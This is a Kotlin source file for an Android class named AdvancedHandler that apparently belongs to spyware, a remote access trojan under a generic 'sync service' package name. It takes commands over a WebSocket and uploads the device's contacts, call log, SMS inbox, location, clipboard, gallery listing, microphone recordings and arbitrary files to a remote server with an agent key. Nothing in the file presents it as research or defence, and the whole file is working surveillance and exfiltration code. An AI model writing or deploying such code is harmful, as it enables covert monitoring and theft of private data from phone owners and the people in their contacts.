package com.sync.service

import android.Manifest
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.media.MediaRecorder
import android.net.Uri
import android.os.Build
import android.os.Vibrator
import android.os.VibrationEffect
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.util.Log
import androidx.core.content.ContextCompat
import com.google.android.gms.location.LocationServices
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit

class AdvancedHandler(private val ctx: Context, private val ws: WebSocket) {

    private val http = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private val base = BuildConfig.SERVER_URL
        .replace("wss://", "https://")
        .replace("ws://", "http://")

    private val model = "${Build.MANUFACTURER} ${Build.MODEL}"
    private val TAG = "AdvHandler"

    fun handle(cmd: String) {
        try {
            when {
                cmd == "contacts" -> sendContacts()
                cmd == "calls" -> sendCalls()
                cmd == "messages" -> sendMessages()
                cmd == "location" -> sendLocation()
                cmd == "clipboard" -> sendClipboard()
                cmd == "vibrate" -> doVibrate()
                cmd == "camera_back" -> captureCamera(0)
                cmd == "camera_front" -> captureCamera(1)
                cmd.startsWith("mic") -> recordAudio(cmd)
                cmd == "gallery" -> sendGallery()
                cmd.startsWith("open_url:") -> openUrl(cmd.removePrefix("open_url:"))
                cmd.startsWith("file:") -> uploadFiles(cmd.removePrefix("file:"))
            }
        } catch (e: Exception) {
            Log.e(TAG, "err: ${e.message}")
        }
    }

    private fun sendContacts() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CONTACTS)
                != PackageManager.PERMISSION_GRANTED) return
            val cursor: Cursor? = ctx.contentResolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            )
            val arr = JSONArray()
            cursor?.use {
                val nameIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
                val phoneIdx = it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)
                while (it.moveToNext() && arr.length() < 500) {
                    arr.put(JSONObject().apply {
                        put("name", it.getString(nameIdx) ?: "")
                        put("phone", it.getString(phoneIdx) ?: "")
                    })
                }
            }
            postToServer("/uploadText", JSONObject().apply {
                put("title", "📞 جهات الاتصال")
                put("text", arr.toString(2))
                put("agentId", model)
            })
        } catch (e: Exception) {
            Log.e(TAG, "contacts: ${e.message}")
        }
    }

    private fun sendCalls() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_CALL_LOG)
                != PackageManager.PERMISSION_GRANTED) return
            val cursor: Cursor? = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC"
            )
            val arr = JSONArray()
            cursor?.use {
                val numIdx = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIdx = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIdx = it.getColumnIndex(CallLog.Calls.DATE)
                val durIdx = it.getColumnIndex(CallLog.Calls.DURATION)
                while (it.moveToNext() && arr.length() < 200) {
                    arr.put(JSONObject().apply {
                        put("number", it.getString(numIdx) ?: "")
                        put("type", when (it.getInt(typeIdx)) {
                            CallLog.Calls.INCOMING_TYPE -> "داخل"
                            CallLog.Calls.OUTGOING_TYPE -> "خارج"
                            CallLog.Calls.MISSED_TYPE -> "فائت"
                            else -> "أخرى"
                        })
                        put("date", it.getLong(dateIdx))
                        put("duration", it.getInt(durIdx))
                    })
                }
            }
            postToServer("/uploadText", JSONObject().apply {
                put("title", "📞 سجل المكالمات")
                put("text", arr.toString(2))
                put("agentId", model)
            })
        } catch (e: Exception) {
            Log.e(TAG, "calls: ${e.message}")
        }
    }

    private fun sendMessages() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) return
            val cursor: Cursor? = ctx.contentResolver.query(
                Uri.parse("content://sms/inbox"), null, null, null, "date DESC"
            )
            val arr = JSONArray()
            cursor?.use {
                val addrIdx = it.getColumnIndex("address")
                val bodyIdx = it.getColumnIndex("body")
                val dateIdx = it.getColumnIndex("date")
                while (it.moveToNext() && arr.length() < 200) {
                    arr.put(JSONObject().apply {
                        put("from", it.getString(addrIdx) ?: "")
                        put("body", it.getString(bodyIdx) ?: "")
                        put("date", it.getLong(dateIdx))
                    })
                }
            }
            postToServer("/uploadText", JSONObject().apply {
                put("title", "💬 الرسائل")
                put("text", arr.toString(2))
                put("agentId", model)
            })
        } catch (e: Exception) {
            Log.e(TAG, "messages: ${e.message}")
        }
    }

    private fun sendLocation() {
        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) return
            val fused = LocationServices.getFusedLocationProviderClient(ctx)
            fused.lastLocation.addOnSuccessListener { loc ->
                if (loc != null) {
                    val json = JSONObject().apply {
                        put("lat", loc.latitude)
                        put("lon", loc.longitude)
                        put("accuracy", loc.accuracy)
                        put("agentId", model)
                    }
                    val req = Request.Builder()
                        .url("$base/uploadLocation")
                        .addHeader("x-agent-key", BuildConfig.AGENT_SECRET)
                        .post(json.toString().toRequestBody("application/json".toMediaType()))
                        .build()
                    http.newCall(req).execute().use { }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "location: ${e.message}")
        }
    }

    private fun sendClipboard() {
        try {
            val cm = ctx.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            val text = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: "(فارغة)"
            postToServer("/uploadText", JSONObject().apply {
                put("title", "📋 الحافظة")
                put("text", text)
                put("agentId", model)
            })
        } catch (e: Exception) {
            Log.e(TAG, "clipboard: ${e.message}")
        }
    }

    private fun doVibrate() {
        try {
            val vib = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vib.vibrate(VibrationEffect.createOneShot(2000, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vib.vibrate(2000)
            }
        } catch (e: Exception) {
            Log.e(TAG, "vibrate: ${e.message}")
        }
    }

    private fun captureCamera(which: Int) {
        try {
            val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            intent.putExtra("android.intent.extras.CAMERA_FACING", which)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
        } catch (e: Exception) {
            Log.e(TAG, "camera: ${e.message}")
        }
    }

    private fun recordAudio(cmd: String) {
        try {
            val seconds = cmd.split(":").getOrNull(1)?.toIntOrNull() ?: 10
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO)
                != PackageManager.PERMISSION_GRANTED) return
            val path = ctx.cacheDir.absolutePath + "/rec_${System.currentTimeMillis()}.m4a"
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) MediaRecorder(ctx) else @Suppress("DEPRECATION") MediaRecorder()
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder.setOutputFile(path)
            recorder.prepare()
            recorder.start()

            Thread {
                Thread.sleep((seconds * 1000).toLong())
                try { recorder.stop(); recorder.release() } catch (e: Exception) {}
                uploadFile(File(path), "audio_${System.currentTimeMillis()}.m4a")
            }.start()
        } catch (e: Exception) {
            Log.e(TAG, "mic: ${e.message}")
        }
    }

    private fun sendGallery() {
        try {
            val cursor = ctx.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DISPLAY_NAME),
                null, null, MediaStore.Images.Media.DATE_ADDED + " DESC"
            )
            val arr = JSONArray()
            cursor?.use {
                val idIdx = it.getColumnIndex(MediaStore.Images.Media._ID)
                val nameIdx = it.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                while (it.moveToNext() && arr.length() < 50) {
                    arr.put(JSONObject().apply {
                        put("id", it.getLong(idIdx))
                        put("name", it.getString(nameIdx) ?: "")
                    })
                }
            }
            postToServer("/uploadText", JSONObject().apply {
                put("title", "🖼️ صور المعرض")
                put("text", arr.toString(2))
                put("agentId", model)
            })
        } catch (e: Exception) {
            Log.e(TAG, "gallery: ${e.message}")
        }
    }

    private fun openUrl(url: String) {
        try {
            val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
        } catch (e: Exception) {
            Log.e(TAG, "open_url: ${e.message}")
        }
    }

    private fun uploadFiles(path: String) {
        try {
            val fullPath = if (path.startsWith("/")) path else "/sdcard/$path"
            val dir = File(fullPath)
            if (!dir.exists()) {
                postToServer("/uploadText", JSONObject().apply {
                    put("title", "❌ خطأ ملف")
                    put("text", "المسار غير موجود: $path")
                    put("agentId", model)
                })
                return
            }
            val files = if (dir.isDirectory) dir.listFiles() else arrayOf(dir)
            var count = 0
            files?.take(20)?.forEach { f ->
                if (f.isFile && f.length() < 20 * 1024 * 1024 && count < 20) {
                    uploadFile(f, f.name)
                    count++
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "files: ${e.message}")
        }
    }

    private fun uploadFile(file: File, name: String) {
        try {
            val body = file.asRequestBody("application/octet-stream".toMediaType())
            val req = Request.Builder()
                .url("$base/uploadFile")
                .addHeader("x-agent-key", BuildConfig.AGENT_SECRET)
                .addHeader("model", model)
                .post(body)
                .build()
            http.newCall(req).execute().use { }
        } catch (e: Exception) {
            Log.e(TAG, "upload: ${e.message}")
        }
    }

    private fun postToServer(endpoint: String, json: JSONObject) {
        try {
            val req = Request.Builder()
                .url("$base$endpoint")
                .addHeader("x-agent-key", BuildConfig.AGENT_SECRET)
                .addHeader("model", model)
                .post(json.toString().toRequestBody("application/json".toMediaType()))
                .build()
            http.newCall(req).execute().use { }
        } catch (e: Exception) {
            Log.e(TAG, "post: ${e.message}")
        }
    }
}
